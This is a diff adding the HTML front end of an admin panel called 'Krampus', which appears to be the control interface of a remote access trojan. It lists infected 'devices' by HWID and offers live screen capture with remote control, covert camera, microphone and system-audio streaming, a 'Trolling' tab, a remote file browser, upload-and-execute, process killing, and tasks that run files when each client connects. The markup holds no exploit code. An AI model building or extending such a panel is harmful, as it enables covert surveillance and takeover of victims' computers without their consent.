@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel</title>
+    <link rel="icon" href="/static/favicon.ico">
+    <link rel="stylesheet" href="/static/css/admin.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jsvectormap@1.5.3/dist/css/jsvectormap.min.css">
+    <link rel="stylesheet" href="/static/css/sticky_cursor.css">
+</head>
+<body>
+    <div id="background-overlay"></div>
+
+    <header class="header">
+        <div class="header-left">
+            <button id="burger-menu" class="burger-menu" data-sticky>
+                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path></svg>
+                <div data-sticky-area></div>
+            </button>
+            <h1 class="header-title">Krampus</h1>
+        </div>
+        <div class="theme-options">
+            <input type="radio" id="default" name="theme" class="theme-radio">
+            <label for="default" class="theme-label">Auto</label>
+            <input type="radio" id="light" name="theme" class="theme-radio">
+            <label for="light" class="theme-label">Light</label>
+            <input type="radio" id="dark" name="theme" class="theme-radio">
+            <label for="dark" class="theme-label">Dark</label>
+        </div>
+    </header>
+
+    <nav id="sidebar">
+        <a href="#" class="nav-link active" data-target="devices-section">
+            <svg class="icon" viewBox="0 0 24 24"><path d="M4 6h16v2H4zm0 5h16v2H4zm0 5h16v2H4z"></path></svg>
+            Devices
+        </a>
+        <a href="#" class="nav-link" data-target="monitoring-section">
+            <svg class="icon" viewBox="0 0 24 24"><path d="M21,16V4H3V16H21M21,2A2,2 0 0,1 23,4V16A2,2 0 0,1 21,18H3C1.89,18 1,17.1 1,16V4C1,2.89 1.89,2 3,2H21Z" /></svg>
+            Monitoring
+        </a>
+        <a href="#" class="nav-link" data-target="statistics-section">
+            <svg class="icon" viewBox="0 0 24 24"><path d="M5 9.2h3V19H5zM10.6 5h2.8v14h-2.8zm5.6 8H19v6h-2.8z"></path></svg>
+            Statistics
+        </a>
+        <a href="#" class="nav-link" data-target="tasks-section">
+            <svg class="icon" viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zM6 20V4h7v5h5v11H6z"></path></svg>
+            Tasks
+        </a>
+        <a href="#" class="nav-link" data-target="settings-section">
+            <svg class="icon" viewBox="0 0 24 24"><path d="M19.4 12c0-.2.1-.4.1-.6s0-.4-.1-.6l2.1-1.7c.2-.1.2-.4.1-.6l-2-3.5c-.1-.2-.4-.2-.6-.1l-2.5 1c-.5-.4-1-.7-1.5-.9l-.4-2.7c0-.2-.2-.4-.4-.4h-4c-.2 0-.4.2-.4.4l-.4 2.7c-.5.2-1 .5-1.5-.9l-2.5-1c-.2-.1-.5 0-.6.1l-2 3.5c-.1.2 0 .5.1.6l2.1 1.7c0 .2-.1.4-.1.6s0 .4.1.6l-2.1 1.7c-.2-.1-.2.4-.1.6l2 3.5c.1.2.4.2.6.1l2.5-1c.5.4 1 .7 1.5.9l.4 2.7c0 .2.2.4.4.4h4c.2 0 .4-.2.4-.4l.4-2.7c.5-.2 1-.5 1.5-.9l2.5 1c.2.1.5 0 .6-.1l2 3.5c.1-.2 0-.5-.1-.6l-2.1-1.7zM12 15.5c-1.9 0-3.5-1.6-3.5-3.5s1.6-3.5 3.5-3.5 3.5 1.6 3.5 3.5-1.6 3.5-3.5 3.5z"></path></svg>
+            Settings
+        </a>
+    </nav>
+    
+    <div id="main-content">
+        <main class="container main-section active" id="devices-section">
+            <div class="stats"><span>Total devices: <span id="total">0</span></span></div>
+            <section class="command-section">
+                <div class="input-wrapper">
+                    <input type="text" id="searchInput" class="input" placeholder="Search by User, HWID...">
+                </div>
+            </section>
+            <section class="clients-list"><h3>Devices</h3><div id="clientsContainer">Loading...</div></section>
+        </main>
+
+        <main class="container main-section" id="monitoring-section">
+            <h3>Live Monitoring</h3>
+            <div id="monitoring-grid" class="monitoring-grid">
+                <p>Starting live monitoring...</p>
+            </div>
+        </main>
+        
+        <main class="container main-section" id="statistics-section">
+            <h3>Statistics</h3>
+            <div class="statistics-grid">
+                <div class="stat-card">
+                    <h4>Device Status</h4>
+                    <div class="stat-item">
+                        <span>Online</span>
+                        <span id="stat-online">0</span>
+                    </div>
+                    <div class="stat-item">
+                        <span>Offline</span>
+                        <span id="stat-offline">0</span>
+                    </div>
+                    <div class="stat-item total">
+                        <span>Total</span>
+                        <span id="stat-total">0</span>
+                    </div>
+                </div>
+                <div class="stat-card">
+                    <h4>Operating Systems</h4>
+                    <div id="stat-os-dist">
+                        <p>Loading...</p>
+                    </div>
+                </div>
+                <div class="stat-card">
+                    <h4>Device Types</h4>
+                    <div id="stat-device-dist">
+                        <p>Loading...</p>
+                    </div>
+                </div>
+                <div class="stat-card">
+                    <h4>Countries (by language)</h4>
+                    <div id="stat-country-dist">
+                        <p>Loading...</p>
+                    </div>
+                </div>
+                <div class="stat-card stat-card-full-width">
+                    <h4>Clients Map</h4>
+                    <div id="clients-map" style="width: 100%; height: 400px; background: var(--button-bg); border-radius: 8px;"></div>
+                </div>
+            </div>
+        </main>
+        
+        <main class="container main-section" id="tasks-section">
+            <h3>Task Manager</h3>
+            <div class="task-container">
+                <div class="settings-card">
+                    <h4>Create New Task</h4>
+                    <form id="createTaskForm" class="task-form">
+                        <input type="text" id="taskName" class="input" placeholder="Task Name" required>
+                        <select id="taskTarget" class="select" required>
+                            <option value="all">All devices</option>
+                        </select>
+                        <select id="taskType" class="select" required>
+                            <option value="immediate">Execute Immediately</option>
+                            <option value="scheduled">Schedule for a specific time</option>
+                            <option value="on_first_connect">On First Client Connect</option>
+                            <option value="on_every_connect">On Every Client Connect</option>
+                        </select>
+                        <input type="datetime-local" id="taskSchedule" class="input" style="display: none;">
+                        <p class="task-type-label">Select a file to execute</p>
+                        <input type="file" id="taskFile" class="input" required>
+                        <button type="submit" class="button">Schedule Task</button>
+                    </form>
+                </div>
+                <div class="settings-card">
+                    <h4>Scheduled Tasks</h4>
+                    <div id="taskList" class="task-list">
+                        <p>No tasks scheduled.</p>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <main class="container main-section" id="settings-section">
+            <h3>Appearance Settings</h3>
+            <div class="settings-card">
+                <h4>Background</h4>
+                <p>Set a custom image (including animated GIFs) as the background for the panel.</p>
+                <div class="setting-item"><label for="bg-image-input" class="button">Upload Image / GIF</label><input type="file" id="bg-image-input" accept="image/*" style="display:none;"><button class="button" id="reset-bg-button">Reset</button></div>
+                <div class="setting-item"><label for="blur-slider">Background Blur</label><div class="slider-container"><span>0px</span><input type="range" id="blur-slider" min="0" max="30" value="5" step="1" class="styled-slider"><span>30px</span></div></div>
+                <hr class="setting-divider">
+                <h4>UI Elements</h4>
+                <p>Adjust the transparency of cards, modals, and navigation panels.</p>
+                <div class="setting-item"><label for="opacity-slider">Opaque</label><div class="slider-container"><span>Transparency</span><input type="range" id="opacity-slider" min="0.1" max="1" value="1" step="0.05" class="styled-slider"><span>Transparent</span></div></div>
+            </div>
+            <div class="settings-card">
+                <h4>Cursor</h4>
+                <p>Enable or disable the custom "sticky" cursor effect.</p>
+                <div class="setting-item"><div class="switch-container" style="margin: 0;"><label class="switch"><input type="checkbox" id="stickyCursorToggle"><span class="slider"></span></label><span class="switch-text-label">Enable Sticky Cursor</span></div></div>
+            </div>
+            <h3>Notifications</h3>
+            <div class="settings-card">
+                <h4>Browser Notifications</h4>
+                <p>Receive a notification when a new device comes online. You may need to grant permission in your browser.</p>
+                <div id="notification-permission-container" class="setting-item"><button class="button" id="enable-notifications-btn" style="display:none;">Enable Notifications</button></div>
+            </div>
+        </main>
+    </div>
+
+<div id="clientModal" class="modal">
+    <div class="modal-content">
+        <span class="close">&times;</span>
+        <h2 id="modalTitle">Device Control</h2>
+        
+        <div class="tabs">
+            <div class="tab active" onclick="openTab('screen', this)">
+                <svg class="icon" viewBox="0 0 24 24"><path d="M21,16V4H3V16H21M21,2A2,2 0 0,1 23,4V16A2,2 0 0,1 21,18H14V20H16V22H8V20H10V18H3C1.89,18 1,17.1 1,16V4C1,2.89 1.89,2 3,2H21M5,6H14V10H5V6M15,6H19V8H15V6M19,9V14H15V9H19Z" /></svg>Screen
+            </div>
+            <div class="tab" onclick="openTab('camera', this)">
+                <svg class="icon" viewBox="0 0 24 24"><path d="M4,4H7L9,2H15L17,4H20A2,2 0 0,1 22,6V18A2,2 0 0,1 20,20H4A2,2 0 0,1 2,18V6A2,2 0 0,1 4,4M12,7A5,5 0 0,0 7,12A5,5 0 0,0 12,17A5,5 0 0,0 17,12A5,5 0 0,0 12,7M12,9A3,3 0 0,1 15,12A3,3 0 0,1 12,15A3,3 0 0,1 9,12A3,3 0 0,1 12,9Z" /></svg>Camera
+            </div>
+            <div class="tab" onclick="openTab('microphone', this)">
+                <svg class="icon" viewBox="0 0 24 24"><path d="M12,2A3,3 0 0,1 15,5V11A3,3 0 0,1 12,14A3,3 0 0,1 9,11V5A3,3 0 0,1 12,2M19,11C19,14.53 16.39,17.44 13,17.93V21H11V17.93C7.61,17.44 5,14.53 5,11H7A5,5 0 0,0 12,16A5,5 0 0,0 17,11H19Z" /></svg>Microphone
+            </div>
+            <div class="tab" onclick="openTab('trolling', this)">
+                <svg class="icon" viewBox="0 0 24 24"><path d="M12,2C6.48,2 2,6.48 2,12s4.48,10 10,10 10-4.48 10-10S17.52,2 12,2zm0,18c-4.41,0-8-3.59-8-8s3.59-8 8-8 8,3.59 8,8-3.59,8-8,8zm-1-12h2v4h-2V8zm0,6h2v2h-2v-2z"></path></svg>Trolling
+            </div>
+            <div class="tab" onclick="openTab('files', this)">
+                <svg class="icon" viewBox="0 0 24 24"><path d="M14,2H6A2,2 0 0,0 4,4V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V8L14,2M18,20H6V4H13V9H18V20Z" /></svg>Files
+            </div>
+            <div class="tab" onclick="openTab('processes', this)">
+                <svg class="icon" viewBox="0 0 24 24"><path d="M3,3H9V7H3V3M15,10H21V14H15V10M9,17H3V21H9V17M15,17H21V21H15V17M9,10H15V14H9V10M3,10H9V14H3V10M15,3H21V7H15V3M9,3H15V7H9V3Z" /></svg>Processes
+            </div>
+            <div class="tab" onclick="openTab('info', this)">
+                <svg class="icon" viewBox="0 0 24 24"><path d="M13,9H11V7H13M13,17H11V11H13M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2Z" /></svg>Info
+            </div>
+        </div>
+
+        <div id="screen" class="tab-content active">
+            <div class="stream-header">
+                <button class="button-icon" id="popoutScreenBtn" title="Pop-out to Overlay">
+                    <svg class="icon" viewBox="0 0 24 24"><path d="M19 11h-8v6h8v-6zm4 8V4.98C23 3.88 22.1 3 21 3H3c-1.1 0-2 .88-2 1.98V19c0 1.1.9 2 2 2h18c1.1 0 2-.9 2-2zm-2 .02H3V4.97h18v14.05z"></path></svg>
+                </button>
+            </div>
+            <div class="device-selection"><h5>Select Monitor:</h5><div id="monitorSelection"><div class="device-option">Loading...</div></div></div>
+            <div class="stream-controls">
+                <div class="switch-container">
+                    <label class="switch"><input type="checkbox" id="screenToggle" onchange="toggleScreenShare()"><span class="slider"></span></label>
+                    <span class="switch-text-label">Screen Streaming</span>
+                </div>
+                <div class="switch-container"><label class="switch"><input type="checkbox" id="remoteControlToggle"><span class="slider"></span></label><span class="switch-text-label">Remote Control</span></div>
+            </div>
+            <div id="screenContainer" class="screen-container"><div id="screenLoading" class="loading">Waiting for stream...</div><img id="screenImage" class="screen-image" style="display: none;"></div>
+        </div>
+
+        <div id="camera" class="tab-content">
+            <div class="stream-header">
+                <button class="button-icon" id="popoutCameraBtn" title="Pop-out to Overlay">
+                    <svg class="icon" viewBox="0 0 24 24"><path d="M19 11h-8v6h8v-6zm4 8V4.98C23 3.88 22.1 3 21 3H3c-1.1 0-2 .88-2 1.98V19c0 1.1.9 2 2 2h18c1.1 0 2-.9 2-2zm-2 .02H3V4.97h18v14.05z"></path></svg>
+                </button>
+            </div>
+            <div class="device-selection"><h5>Select Camera:</h5><div id="cameraSelection"><div class="device-option">Loading...</div></div></div>
+            <div class="switch-container">
+                <label class="switch"><input type="checkbox" id="cameraToggle" onchange="toggleCameraStream()"><span class="slider"></span></label>
+                <span class="switch-text-label">Camera Streaming</span>
+            </div>
+            <div id="cameraContainer" class="screen-container"><div id="cameraLoading" class="loading">Waiting for stream...</div><img id="cameraImage" class="screen-image" style="display: none;"></div>
+        </div>
+
+        <div id="microphone" class="tab-content">
+            <div class="device-selection">
+                <h5>Select Microphone:</h5>
+                <div id="micSelection"><div class="device-option">Loading...</div></div>
+            </div>
+            <div class="switch-container">
+                <label class="switch"><input type="checkbox" id="audioToggle" onchange="toggleAudioStream()"><span class="slider"></span></label>
+                <span class="switch-text-label">Real-time Audio (Microphone)</span>
+            </div>
+            <div class="switch-container">
+                <label class="switch"><input type="checkbox" id="systemAudioToggle" onchange="toggleSystemAudioStream()"><span class="slider"></span></label>
+                <span class="switch-text-label">Real-time Audio (System)</span>
+            </div>
+            <div id="audioStatusContainer" class="audio-container" style="margin-top: 20px;">
+                <div id="audioStatus">Stopped</div>
+            </div>
+        </div>
+
+        <div id="trolling" class="tab-content">
+            <div class="troll-grid" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px;">
+                <div class="troll-item" style="display: flex; flex-direction: column; gap: 10px;">
+                    <p>Show message box</p>
+                    <input type="text" id="trollMsg" class="input" placeholder="Enter message...">
+                    <button class="button" onclick="trollCommand('troll:msgbox', 'trollMsg')">Show Message</button>
+                </div>
+                <div class="troll-item" style="display: flex; flex-direction: column; gap: 10px;">
+                    <p>Open URL in browser</p>
+                    <input type="text" id="trollUrl" class="input" placeholder="https://example.com">
+                    <button class="button" onclick="trollCommand('troll:open_url', 'trollUrl')">Open URL</button>
+                </div>
+                <div class="troll-item" style="display: flex; flex-direction: column; gap: 10px;">
+                    <p>Text-to-Speech</p>
+                    <input type="text" id="trollSpeech" class="input" placeholder="Enter text to speak...">
+                    <button class="button" onclick="trollCommand('troll:speak', 'trollSpeech')">Speak Text</button>
+                </div>
+                <div class="troll-item" style="display: flex; flex-direction: column; gap: 15px;">
+                    <div class="switch-container" style="margin: 0; justify-content: space-between;">
+                        <span class="switch-text-label">Mouse Trails</span>
+                        <label class="switch"><input type="checkbox" id="trollMouseTrailsToggle"><span class="slider"></span></label>
+                    </div>
+                    <button class="button" onclick="sendCommandToClient(currentClientId, 'troll:toggle_theme')">Toggle System Theme</button>
+                </div>
+                <div class="troll-item" style="display: flex; flex-direction: column; gap: 10px;">
+                    <p>System Volume: <span id="trollVolumeLabel">100</span>%</p>
+                    <input type="range" id="trollVolumeSlider" min="0" max="100" value="100" class="styled-slider" style="width: 100%;">
+                </div>
+                <div class="troll-item" style="display: flex; flex-direction: column; gap: 10px;">
+                    <p>Set Audio Output Device</p>
+                    <select id="trollAudioDeviceSelect" class="select">
+                        <option>Loading devices...</option>
+                    </select>
+                </div>
+                <div class="troll-item" style="display: flex; flex-direction: column; gap: 10px;">
+                    <p>Set Desktop Wallpaper</p>
+                    <input type="file" id="trollWallpaperFile" class="input" accept="image/jpeg,image/png,image/bmp">
+                    <button class="button" onclick="uploadTrollFile('trollWallpaperFile', '/api/troll/wallpaper')">Set Wallpaper</button>
+                </div>
+                <div class="troll-item" style="display: flex; flex-direction: column; gap: 10px;">
+                    <p>Ghost Typing</p>
+                    <input type="text" id="trollGhostType" class="input" placeholder="Text to type...">
+                    <button class="button" onclick="trollCommand('troll:ghost_type', 'trollGhostType')">Start Typing</button>
+                </div>
+                <div class="troll-item" style="display: flex; flex-direction: column; gap: 10px;">
+                    <p>Play Sound</p>
+                    <input type="file" id="trollSoundFile" class="input" accept="audio/wav,audio/mpeg">
+                    <button class="button" onclick="uploadTrollFile('trollSoundFile', '/api/troll/sound')">Play Sound</button>
+                </div>
+            </div>
+        </div>
+        
+        <div id="files" class="tab-content">
+            <div class="files-tab-grid">
+                <div class="file-upload-container">
+                    <h5>Upload and Execute File</h5>
+                    
+                    <div id="file-selection-area">
+                        <form class="file-upload-form" id="uploadForm">
+                            <label for="file" class="file-upload-label">
+                                <div class="file-upload-design">
+                                    <svg viewBox="0 0 640 512" height="1em"><path d="M144 480C64.5 480 0 415.5 0 336c0-62.8 40.2-116.2 96.2-135.9c-.1-2.7-.2-5.4-.2-8.1c0-88.4 71.6-160 160-160c59.3 0 111 32.2 138.7 80.2C409.9 102 428.3 96 448 96c53 0 96 43 96 96c0 12.2-2.3 23.8-6.4 34.6C596 238.4 640 290.1 640 352c0 70.7-57.3 128-128 128H144zm79-217c-9.4 9.4-9.4 24.6 0 33.9s24.6 9.4 33.9 0l39-39V392c0 13.3 10.7 24 24 24s24-10.7 24-24V257.9l39 39c9.4 9.4 24.6 9.4 33.9 0s9.4-24.6 0-33.9l-80-80c-9.4-9.4-24.6-9.4-33.9 0l-80 80z"></path></svg>
+                                    <p>Drag and Drop</p><p>or</p>
+                                    <span class="browse-button">Browse file</span>
+                                </div>
+                                <input id="file" type="file" />
+                            </label>
+                        </form>
+                    </div>
+
+                    <div id="file-confirmation-area" style="display: none;">
+                        <div class="file-info-display">
+                            <span id="confirm-file-name"></span>
+                            <small id="confirm-file-size"></small>
+                        </div>
+                        <div class="confirmation-actions">
+                            <button id="cancel-upload-btn" class="button" title="Cancel">
+                                <svg class="icon" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
+                            </button>
+                            <button id="confirm-upload-btn" class="button button-send">Confirm upload</button>
+                        </div>
+                    </div>
+
+                    <div id="uploadProgressContainer" style="display: none;">
+                        <div id="uploadProgress">
+                            <div id="progressBar"></div>
+                        </div>
+                        <div id="progressText" style="text-align: center;"></div>
+                    </div>
+                </div>
+                <div class="file-browser-container">
+                    <h5 id="fileManagerPath">Path: /</h5>
+                    <div class="file-browser-table-wrapper">
+                        <table class="file-browser-table">
+                            <thead>
+                                <tr>
+                                    <th style="width: 40px;"></th>
+                                    <th>Name</th>
+                                    <th style="width: 100px;">Size</th>
+                                    <th style="width: 150px;">Modified</th>
+                                    <th style="width: 60px;"></th>
+                                </tr>
+                            </thead>
+                            <tbody id="fileListBody">
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="processes" class="tab-content">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                <h4>Process Manager</h4>
+                <button class="button" onclick="requestProcessList()">
+                    <svg class="icon" style="width:18px; height:18px;" viewBox="0 0 24 24"><path d="M17.65,6.35C16.2,4.9 14.21,4 12,4A8,8 0 0,0 4,12A8,8 0 0,0 12,20C15.73,20 18.84,17.45 19.73,14H17.65C16.83,16.33 14.61,18 12,18A6,6 0 0,1 6,12A6,6 0 0,1 12,6C13.66,6 15.14,6.69 16.22,7.78L13,11H20V4L17.65,6.35Z" /></svg>
+                    Refresh
+                </button>
+            </div>
+            <div class="file-browser-table-wrapper" style="height: 450px;">
+                <table class="file-browser-table">
+                    <thead>
+                        <tr>
+                            <th style="width: 80px;">PID</th>
+                            <th>Process Name</th>
+                            <th>Window Title</th>
+                            <th style="width: 120px;">Memory</th>
+                            <th style="width: 80px;">Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="processListBody">
+                        <tr><td colspan="5" style="text-align:center;">Click 'Refresh' to load processes.</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <div id="info" class="tab-content">
+            <h4>Device Information</h4><div id="deviceInfo"><p>Loading device info...</p></div>
+        </div>
+
+    </div>
+</div>
+    <div id="fullscreenModal" class="fullscreen-modal"><span class="fullscreen-close" onclick="closeFullscreen()">&times;</span><div class="fullscreen-content"><img id="fullscreenImage" class="fullscreen-image"></div></div>
+    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/jsvectormap@1.5.3/dist/js/jsvectormap.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/jsvectormap@1.5.3/dist/maps/world.js"></script>
+    <script src="/static/js/admin.js"></script>
+</body>
+</html>
